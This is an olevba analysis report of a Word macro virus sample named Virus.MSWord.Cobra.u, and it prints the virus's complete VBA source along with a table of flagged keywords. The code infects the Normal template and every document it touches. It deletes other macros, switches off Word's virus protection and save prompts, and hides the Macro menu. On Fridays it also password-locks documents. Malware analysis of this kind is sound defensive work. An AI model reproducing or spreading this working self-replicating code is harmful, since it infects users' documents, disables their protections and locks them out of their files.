olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Apr30.bas 
in file: Virus.MSWord.Cobra.u - OLE stream: 'Macros/VBA/Apr30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=> Step 1
Sub AutoClose()
On Error Resume Next
Call InfectDocNor
If WeekDay(Date) = 6 Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Password:="Apr30"
End If
End Sub
Sub AutoOpen()
Call InfectDocNor
End Sub
Sub FilePrint()
Call InfectDocNor
With ActiveDocument.Sections(1)
.Footers(wdHeaderFooterPrimary).Range.Text = "Apr30"
End With
Dialogs(wdDialogFilePrint).Show
End Sub
Sub InfectDocNor()
On Error Resume Next
Dim IncDoc, IncNor As Boolean
IncDoc = False
IncNor = False
For Each MC In ActiveDocument.VBProject.VBComponents
If MC.Name = "Apr30" Then IncDoc = True
If MC.Name <> "ThisDocument" And MC.Name <> "Apr30" And MC.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncDoc = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Apr30", Object:=wdOrganizerObjectProjectItems
End If
For Each MC In NormalTemplate.VBProject.VBComponents
If MC.Name = "Apr30" Then IncNor = True
If MC.Name <> "ThisDocument" And MC.Name <> "Apr30" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Apr30", Object:=wdOrganizerObjectProjectItems
End If
CustomizationContext = NormalTemplate
With Options
.VirusProtection = False
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Macro").Visible = False
End Sub
Sub ViewVBCode()
Call Infectdoc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

